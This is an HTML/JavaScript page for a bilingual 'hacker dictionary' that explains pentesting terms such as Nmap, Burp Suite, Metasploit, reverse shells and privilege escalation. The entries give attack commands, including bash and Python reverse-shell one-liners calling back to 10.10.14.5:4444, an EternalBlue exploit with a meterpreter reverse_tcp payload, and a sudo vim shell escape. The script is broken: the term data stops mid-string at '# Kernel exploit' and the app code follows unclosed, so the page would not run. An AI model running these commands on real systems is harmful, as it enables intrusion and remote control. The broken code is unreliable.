<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0xDictionary - Diccionario Hacker</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0f0f23;
            --bg-card: #1a1a2e;
            --bg-hover: #252540;
            --accent: #00e5ff;
            --accent-dark: #00b8d4;
            --accent-glow: rgba(0, 229, 255, 0.2);
            --text-primary: #ffffff;
            --text-secondary: #b0b0c8;
            --text-muted: #6b6b8f;
            --border: #2a2a45;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'DM Sans', sans-serif;
            background: var(--bg-dark);
            color: var(--text-primary);
            line-height: 1.6;
            overflow-x: hidden;
        }

        .bg-animation {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 0;
            opacity: 0.03;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.5) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 229, 255, 0.5) 0%, transparent 50%),
                radial-gradient(circle at 40% 20%, rgba(245, 87, 108, 0.5) 0%, transparent 50%);
            background-size: 100% 100%;
            animation: bgMove 20s ease infinite;
        }

        @keyframes bgMove {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(5deg); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        header {
            text-align: center;
            padding: 4rem 2rem 3rem;
            margin-bottom: 3rem;
            position: relative;
        }

        .language-toggle {
            position: absolute;
            top: 2rem;
            right: 2rem;
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 12px;
            padding: 0.5rem;
            display: flex;
            gap: 0.5rem;
        }

        .lang-btn {
            padding: 0.5rem 1rem;
            background: transparent;
            border: none;
            border-radius: 8px;
            color: var(--text-secondary);
            font-size: 0.875rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-transform: uppercase;
            font-family: 'DM Sans', sans-serif;
        }

        .lang-btn:hover {
            color: var(--accent);
        }

        .lang-btn.active {
            background: var(--accent);
            color: var(--bg-dark);
        }

        .logo {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 4rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00e5ff 0%, #667eea 50%, #f5576c 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1rem;
            letter-spacing: -2px;
        }

        .tagline {
            font-size: 1.125rem;
            color: var(--text-secondary);
            font-weight: 500;
        }

        .search-section {
            max-width: 800px;
            margin: 0 auto 4rem;
            display: flex;
            gap: 1rem;
            align-items: stretch;
        }

        .search-wrapper {
            flex: 1;
            position: relative;
        }

        .search-input {
            width: 100%;
            padding: 1.25rem 1.5rem 1.25rem 3.5rem;
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 16px;
            color: var(--text-primary);
            font-size: 1rem;
            font-family: 'DM Sans', sans-serif;
            transition: all 0.3s ease;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 4px var(--accent-glow);
        }

        .search-icon {
            position: absolute;
            left: 1.25rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.5rem;
            color: var(--text-muted);
        }

        .filter-btn {
            padding: 1.25rem 2rem;
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 16px;
            color: var(--text-primary);
            font-size: 1rem;
            font-family: 'DM Sans', sans-serif;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.3s ease;
            position: relative;
        }

        .filter-btn:hover {
            background: var(--bg-hover);
            border-color: var(--accent);
        }

        .filter-btn.active {
            border-color: var(--accent);
            background: var(--bg-hover);
        }

        .filter-count {
            background: var(--accent);
            color: var(--bg-dark);
            font-size: 0.75rem;
            font-weight: 700;
            padding: 0.25rem 0.5rem;
            border-radius: 12px;
            min-width: 20px;
            text-align: center;
        }

        .filter-dropdown {
            position: absolute;
            top: calc(100% + 0.5rem);
            right: 0;
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 16px;
            padding: 1.5rem;
            min-width: 320px;
            max-height: 400px;
            overflow-y: auto;
            display: none;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            z-index: 100;
        }

        .filter-dropdown.active {
            display: block;
            animation: slideDown 0.3s ease;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .filter-dropdown h3 {
            font-size: 0.875rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-muted);
            margin-bottom: 1rem;
        }

        .tags-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .tag-option {
            padding: 0.5rem 1rem;
            background: var(--bg-dark);
            border: 2px solid var(--border);
            border-radius: 8px;
            color: var(--text-secondary);
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.2s ease;
            font-weight: 500;
        }

        .tag-option:hover {
            border-color: var(--accent);
            color: var(--accent);
            transform: translateY(-2px);
        }

        .tag-option.selected {
            background: var(--accent);
            border-color: var(--accent);
            color: var(--bg-dark);
        }

        .letter-group {
            margin-bottom: 4rem;
        }

        .letter-header {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1.5rem;
            display: inline-block;
        }

        .terms-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 1.5rem;
        }

        .term-card {
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 20px;
            padding: 2rem;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .term-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            transform: scaleX(0);
            transform-origin: left;
            transition: transform 0.3s ease;
        }

        .term-card:hover {
            border-color: var(--accent);
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
        }

        .term-card:hover::before {
            transform: scaleX(1);
        }

        .term-header {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            margin-bottom: 1rem;
        }

        .term-title {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--text-primary);
            line-height: 1.2;
        }

        .term-category-badge {
            padding: 0.375rem 0.875rem;
            border-radius: 8px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            white-space: nowrap;
        }

        .category-web { background: rgba(102, 126, 234, 0.2); color: #667eea; }
        .category-herramientas { background: rgba(0, 229, 255, 0.2); color: #00e5ff; }
        .category-técnicas { background: rgba(245, 87, 108, 0.2); color: #f5576c; }
        .category-reconocimiento { background: rgba(240, 147, 251, 0.2); color: #f093fb; }
        .category-defensivas { background: rgba(79, 172, 254, 0.2); color: #4facfe; }
        .category-conceptos { background: rgba(118, 75, 162, 0.2); color: #764ba2; }
        .category-social-engineering { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
        .category-malware { background: rgba(255, 159, 67, 0.2); color: #ff9f43; }
        .category-metodologías { background: rgba(46, 213, 115, 0.2); color: #2ed573; }
        .category-ataques { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
        .category-criptografía { background: rgba(87, 96, 111, 0.2); color: #57606f; }
        .category-redes { background: rgba(30, 144, 255, 0.2); color: #1e90ff; }
        .category-vulnerabilidad { background: rgba(251, 252, 253, 0.866); color: #6f7174; }

        .category-social-engineering { background: rgba(255, 107, 107, 0.2); color: #ff6b6b; }
        .category-tools { background: rgba(0, 229, 255, 0.2); color: #00e5ff; }
        .category-techniques { background: rgba(245, 87, 108, 0.2); color: #f5576c; }
        .category-reconnaissance { background: rgba(240, 147, 251, 0.2); color: #f093fb; }
        .category-defensive { background: rgba(79, 172, 254, 0.2); color: #4facfe; }
        .category-concepts { background: rgba(118, 75, 162, 0.2); color: #764ba2; }
        .category-attacks { background: rgba(255, 71, 87, 0.2); color: #ff4757; }
        .category-cryptography { background: rgba(87, 96, 111, 0.2); color: #57606f; }
        .category-networks { background: rgba(30, 144, 255, 0.2); color: #1e90ff; }
        .category-vulnerability { background: rgba(251, 252, 253, 0.866); color: #6f7174; }
        .category-methodologies { background: rgba(46, 213, 115, 0.2); color: #2ed573; }

        .term-definition {
            color: var(--text-secondary);
            font-size: 0.9375rem;
            line-height: 1.7;
            margin-bottom: 1.25rem;
        }

        .term-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .tag {
            padding: 0.375rem 0.75rem;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 6px;
            font-size: 0.8125rem;
            color: var(--text-muted);
            font-weight: 500;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: blur(10px);
            z-index: 1000;
            overflow-y: auto;
            padding: 2rem 1rem;
        }

        .modal.active {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .modal-content {
            background: var(--bg-card);
            border: 2px solid var(--border);
            border-radius: 24px;
            max-width: 900px;
            width: 100%;
            padding: 3rem;
            position: relative;
            animation: slideUp 0.4s ease;
            margin: 2rem auto;
            min-height: auto;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .modal-close {
            position: absolute;
            top: 1.5rem;
            right: 1.5rem;
            background: var(--accent);
            border: none;
            width: 50px;
            height: 50px;
            border-radius: 12px;
            color: var(--bg-dark);
            font-size: 2rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            line-height: 1;
        }

        .modal-close:hover {
            background: #f5576c;
            transform: scale(1.1);
        }

        .modal-title {
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 1.5rem;
            line-height: 1.2;
            padding-right: 60px;
        }

        .info-box {
            background: var(--bg-dark);
            border: 2px solid var(--border);
            border-radius: 16px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }

        .info-box h3 {
            color: var(--accent);
            font-size: 1rem;
            font-weight: 700;
            margin-bottom: 1rem;
            font-family: 'Space Grotesk', sans-serif;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .info-box p {
            color: var(--text-secondary);
            line-height: 1.8;
            font-size: 0.9375rem;
            margin: 0;
        }

        .info-box .code-block {
            margin: 0;
        }

        .code-block {
            background: var(--bg-dark);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
        }

        .code-block code {
            color: var(--accent);
            font-size: 0.9rem;
            line-height: 1.6;
            white-space: pre-wrap;
        }

        .no-results {
            text-align: center;
            padding: 6rem 2rem;
            color: var(--text-muted);
        }

        .no-results-icon {
            font-size: 5rem;
            margin-bottom: 1.5rem;
            opacity: 0.3;
        }

        .no-results h3 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
            color: var(--text-secondary);
        }

        footer {
            text-align: center;
            padding: 4rem 2rem;
            color: var(--text-muted);
            font-size: 0.875rem;
            margin-top: 4rem;
            border-top: 1px solid var(--border);
        }

        @media (max-width: 768px) {
            .logo {
                font-size: 2.5rem;
            }

            .language-toggle {
                top: 1rem;
                right: 1rem;
            }

            .search-section {
                flex-direction: column;
            }

            .filter-dropdown {
                right: 0;
                left: 0;
                min-width: auto;
            }

            .terms-grid {
                grid-template-columns: 1fr;
            }

            .letter-header {
                font-size: 2rem;
            }

            .modal {
                padding: 1rem;
            }

            .modal-content {
                padding: 2rem;
                margin: 1rem auto;
            }

            .modal-title {
                font-size: 2rem;
                padding-right: 50px;
            }

            .modal-close {
                top: 1rem;
                right: 1rem;
                width: 45px;
                height: 45px;
            }
        }

        ::-webkit-scrollbar {
            width: 10px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-dark);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent);
        }
    </style>
</head>
<body>
    <div class="bg-animation"></div>

    <header>
        <div class="language-toggle">
            <button class="lang-btn active" onclick="setLanguage('es')" id="langEs">ES</button>
            <button class="lang-btn" onclick="setLanguage('en')" id="langEn">EN</button>
        </div>
        <div class="logo">0xDictionary</div>
        <div class="tagline" id="tagline">El diccionario definitivo para hackers y pentesters</div>
    </header>

    <div class="container">
        <div class="search-section">
            <div class="search-wrapper">
                <span class="search-icon">🔍</span>
                <input 
                    type="text" 
                    id="searchInput" 
                    class="search-input" 
                    placeholder="Buscar términos, técnicas, herramientas..."
                >
            </div>
            
            <div style="position: relative;">
                <button class="filter-btn" id="filterBtn">
                    <span id="filterText">Filtros</span>
                    <span class="filter-count" id="filterCount" style="display: none;">0</span>
                </button>
                
                <div class="filter-dropdown" id="filterDropdown">
                    <h3 id="categoriesText">Categorías</h3>
                    <div class="tags-grid" id="tagsGrid"></div>
                </div>
            </div>
        </div>

        <div id="contentContainer"></div>
    </div>

    <footer>
        <p>0xDictionary - Construido para la comunidad hacker 🔓</p>
        <p style="margin-top: 0.5rem;">Open source • Educativo • Sin censura</p>
    </footer>

    <div class="modal" id="termModal">
        <div class="modal-content">
            <button class="modal-close" onclick="closeModal()">×</button>
            <div id="modalBody"></div>
        </div>
    </div>

    <script>
        // Términos con traducciones
        const termsData = {
            es: [
            {
                title: "Nmap",
                slug: "nmap",
                category: "Herramientas",
                tags: ["herramientas", "redes", "escaneo", "reconocimiento"],
                definition: "Network Mapper - Herramienta de código abierto para exploración de redes y auditorías de seguridad.",
                explanation: "Permite descubrir hosts activos en una red, identificar puertos abiertos, determinar servicios y versiones en ejecución, y detectar sistemas operativos. Utiliza diversos tipos de escaneo (TCP SYN, TCP Connect, UDP, etc.) y puede ejecutar scripts NSE (Nmap Scripting Engine) para detección de vulnerabilidades específicas. Es la herramienta estándar para la fase de reconocimiento en pentesting.",
                example: `nmap -sS -sV -O 192.168.1.0/24
nmap -p- --min-rate 10000 target.com
nmap --script vuln target.com`,
                importance: "Fundamental en cualquier auditoría de seguridad, permite mapear la superficie de ataque y es el primer paso en la mayoría de pruebas de penetración. Su versatilidad y precisión la hacen indispensable."
            },
            {
                title: "Burp Suite",
                slug: "burp-suite",
                category: "Herramientas",
                tags: ["herramientas", "web", "proxy", "testing"],
                definition: "Plataforma integrada para realizar pruebas de seguridad en aplicaciones web.",
                explanation: "Funciona como un proxy interceptor que permite analizar y modificar el tráfico HTTP/HTTPS entre el navegador y el servidor. Incluye módulos como Spider (rastreo automático), Scanner (detección de vulnerabilidades), Intruder (ataques automatizados), Repeater (modificación manual de peticiones) y Decoder/Comparer para análisis de datos. La versión Professional añade escaneo automático avanzado.",
                example: `1. Configura proxy en navegador (127.0.0.1:8080)
2. Intercepta petición en Proxy > Intercept
3. Send to Repeater para modificar
4. Send to Intruder para fuzzing`,
                importance: "Es el estándar de facto en pentesting web. Permite identificar y explotar la mayoría de vulnerabilidades web de forma eficiente, tanto manual como automatizada."
            },
            {
                title: "Metasploit",
                slug: "metasploit",
                category: "Herramientas",
                tags: ["herramientas", "explotación", "framework", "pentesting"],
                definition: "Framework de penetración que proporciona información sobre vulnerabilidades y facilita el desarrollo y ejecución de exploits.",
                explanation: "Incluye una extensa base de datos de exploits públicos, payloads, encoders y módulos auxiliares. Permite automatizar muchas fases del pentesting, desde reconocimiento hasta post-explotación. Utiliza un lenguaje de módulos en Ruby y ofrece interfaces tanto CLI (msfconsole) como GUI. Integra herramientas como meterpreter, un payload avanzado que permite control completo del sistema comprometido.",
                example: `msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit`,
                importance: "Acelera dramáticamente el proceso de explotación y es esencial para validar la criticidad real de las vulnerabilidades encontradas. Su biblioteca de exploits se actualiza constantemente."
            },
            {
                title: "Reverse Shell",
                slug: "reverse-shell",
                category: "Técnicas",
                tags: ["técnicas", "explotación", "persistencia"],
                definition: "Conexión shell inversa donde la máquina comprometida se conecta de vuelta al atacante.",
                explanation: "A diferencia de un bind shell (que abre un puerto en la víctima), la reverse shell hace que la víctima inicie la conexión hacia el atacante. Esto es útil para evadir firewalls, ya que las conexiones salientes suelen estar menos restringidas. Se puede implementar en múltiples lenguajes (bash, python, netcat, powershell) y es una de las técnicas más comunes en post-explotación.",
                example: `# Atacante escucha
nc -lvnp 4444

# Víctima se conecta (bash)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'`,
                importance: "Proporciona acceso remoto al sistema comprometido de forma sigilosa. Es el objetivo común tras explotar una vulnerabilidad inicial y permite ejecutar comandos, subir archivos y mantener persistencia."
            },
            {
                title: "Privilege Escalation",
                slug: "privilege-escalation",
                category: "Técnicas",
                tags: ["técnicas", "explotación", "linux", "windows"],
                definition: "Proceso de obtener privilegios superiores a los inicialmente otorgados en un sistema comprometido.",
                explanation: "Tras obtener acceso inicial (usualmente como usuario de bajos privilegios), el objetivo es escalar a root/SYSTEM. Las técnicas incluyen: explotación de kernel vulnerables, binarios SUID mal configurados, tareas programadas inseguras, credenciales hardcodeadas, permisos de sudo incorrectos, y servicios mal configurados. Herramientas como LinPEAS, WinPEAS automatizan la búsqueda de vectores de escalación.",
                example: `# Buscar binarios SUID
find / -perm -4000 2>/dev/null

# Sudo mal configurado
sudo -l
sudo /usr/bin/vim -c ':!/bin/sh'

# Kernel exploit

        let currentLang = 'es';
        let terms = termsData.es;
        let selectedTags = new Set();
        let searchQuery = '';

        const translations = {
            es: {
                tagline: 'El diccionario definitivo para hackers y pentesters',
                searchPlaceholder: 'Buscar términos, técnicas, herramientas...',
                filterText: 'Filtros',
                categoriesText: 'Categorías',
                noResultsTitle: 'No se encontraron resultados',
                noResultsText: 'Intenta ajustar tu búsqueda o filtros',
                definitionLabel: 'Definición',
                explanationLabel: 'Explicación',
                exampleLabel: 'Ejemplo',
                importanceLabel: '¿Por qué importa?'
            },
            en: {
                tagline: 'The definitive dictionary for hackers and pentesters',
                searchPlaceholder: 'Search terms, techniques, tools...',
                filterText: 'Filters',
                categoriesText: 'Categories',
                noResultsTitle: 'No results found',
                noResultsText: 'Try adjusting your search or filters',
                definitionLabel: 'Definition',
                explanationLabel: 'Explanation',
                exampleLabel: 'Example',
                importanceLabel: 'Why it matters?'
            }
        };

        function setLanguage(lang) {
            currentLang = lang;
            terms = termsData[lang];
            
            document.getElementById('langEs').classList.toggle('active', lang === 'es');
            document.getElementById('langEn').classList.toggle('active', lang === 'en');
            
            document.getElementById('tagline').textContent = translations[lang].tagline;
            document.getElementById('searchInput').placeholder = translations[lang].searchPlaceholder;
            document.getElementById('filterText').textContent = translations[lang].filterText;
            document.getElementById('categoriesText').textContent = translations[lang].categoriesText;
            
            selectedTags.clear();
            searchQuery = '';
            document.getElementById('searchInput').value = '';
            
            initializeTagsDropdown();
            renderContent();
        }

        document.addEventListener('DOMContentLoaded', () => {
            initializeTagsDropdown();
            renderContent();
            
            document.getElementById('searchInput').addEventListener('input', (e) => {
                searchQuery = e.target.value.toLowerCase();
                renderContent();
            });

            document.getElementById('filterBtn').addEventListener('click', toggleFilterDropdown);

            document.addEventListener('click', (e) => {
                if (!e.target.closest('#filterBtn') && !e.target.closest('#filterDropdown')) {
                    document.getElementById('filterDropdown').classList.remove('active');
                }
            });
        });

        function initializeTagsDropdown() {
            const allTags = new Set();
            terms.forEach(term => term.tags.forEach(tag => allTags.add(tag)));
            
            const tagsGrid = document.getElementById('tagsGrid');
            tagsGrid.innerHTML = '';
            [...allTags].sort().forEach(tag => {
                const tagEl = document.createElement('div');
                tagEl.className = 'tag-option';
                tagEl.textContent = `#${tag}`;
                tagEl.onclick = () => toggleTag(tag, tagEl);
                tagsGrid.appendChild(tagEl);
            });
        }

        function toggleFilterDropdown() {
            const dropdown = document.getElementById('filterDropdown');
            const btn = document.getElementById('filterBtn');
            dropdown.classList.toggle('active');
            btn.classList.toggle('active');
        }

        function toggleTag(tag, element) {
            if (selectedTags.has(tag)) {
                selectedTags.delete(tag);
                element.classList.remove('selected');
            } else {
                selectedTags.add(tag);
                element.classList.add('selected');
            }
            updateFilterCount();
            renderContent();
        }

        function updateFilterCount() {
            const count = document.getElementById('filterCount');
            if (selectedTags.size > 0) {
                count.textContent = selectedTags.size;
                count.style.display = 'block';
            } else {
                count.style.display = 'none';
            }
        }

        function getFilteredTerms() {
            return terms.filter(term => {
                if (searchQuery) {
                    const matches = 
                        term.title.toLowerCase().includes(searchQuery) ||
                        term.definition.toLowerCase().includes(searchQuery) ||
                        term.explanation.toLowerCase().includes(searchQuery) ||
                        term.tags.some(tag => tag.toLowerCase().includes(searchQuery));
                    if (!matches) return false;
                }
                
                if (selectedTags.size > 0) {
                    const hasAllTags = [...selectedTags].every(tag => term.tags.includes(tag));
                    if (!hasAllTags) return false;
                }
                
                return true;
            });
        }

        function renderContent() {
            const filtered = getFilteredTerms();
            const container = document.getElementById('contentContainer');
            
            if (filtered.length === 0) {
                container.innerHTML = `
                    <div class="no-results">
                        <div class="no-results-icon">🔍</div>
                        <h3>${translations[currentLang].noResultsTitle}</h3>
                        <p>${translations[currentLang].noResultsText}</p>
                    </div>
                `;
                return;
            }

            const grouped = {};
            filtered.forEach(term => {
                const firstChar = term.title[0].toUpperCase();
                const key = /[0-9]/.test(firstChar) ? '0-9' : firstChar;
                if (!grouped[key]) grouped[key] = [];
                grouped[key].push(term);
            });

            const sortedKeys = Object.keys(grouped).sort((a, b) => {
                if (a === '0-9') return -1;
                if (b === '0-9') return 1;
                return a.localeCompare(b);
            });

            container.innerHTML = sortedKeys.map(letter => `
                <div class="letter-group">
                    <div class="letter-header">${letter}</div>
                    <div class="terms-grid">
                        ${grouped[letter].map(term => renderTermCard(term)).join('')}
                    </div>
                </div>
            `).join('');
        }

        function renderTermCard(term) {
            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
            return `
                <div class="term-card" onclick="openModal('${term.slug}')">
                    <div class="term-header">
                        <div class="term-title">${term.title}</div>
                        <div class="term-category-badge ${categoryClass}">${term.category}</div>
                    </div>
                    <div class="term-definition">${term.definition}</div>
                    <div class="term-tags">
                        ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
                    </div>
                </div>
            `;
        }

        function openModal(slug) {
            const term = terms.find(t => t.slug === slug);
            if (!term) return;
            
            const categoryClass = `category-${term.category.toLowerCase().replace(/ /g, '-')}`;
            const modal = document.getElementById('termModal');
            const modalBody = document.getElementById('modalBody');
            
            const escapedExample = term.example
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;');
            
            const t = translations[currentLang];
            
            modalBody.innerHTML = `
                <div class="modal-title">${term.title}</div>
                <div class="term-category-badge ${categoryClass}" style="margin-bottom: 2rem;">${term.category}</div>
                
                <div class="info-box">
                    <h3>${t.definitionLabel}</h3>
                    <p>${term.definition}</p>
                </div>
                
                <div class="info-box">
                    <h3>${t.explanationLabel}</h3>
                    <p>${term.explanation}</p>
                </div>
                
                <div class="info-box">
                    <h3>${t.exampleLabel}</h3>
                    <div class="code-block"><code>${escapedExample}</code></div>
                </div>
                
                <div class="info-box">
                    <h3>${t.importanceLabel}</h3>
                    <p>${term.importance}</p>
                </div>
                
                <div class="term-tags">
                    ${term.tags.map(tag => `<span class="tag">#${tag}</span>`).join('')}
                </div>
            `;
            
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeModal() {
            const modal = document.getElementById('termModal');
            modal.classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        document.getElementById('termModal').addEventListener('click', (e) => {
            if (e.target.id === 'termModal') closeModal();
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeModal();
        });
    </script>
</body>
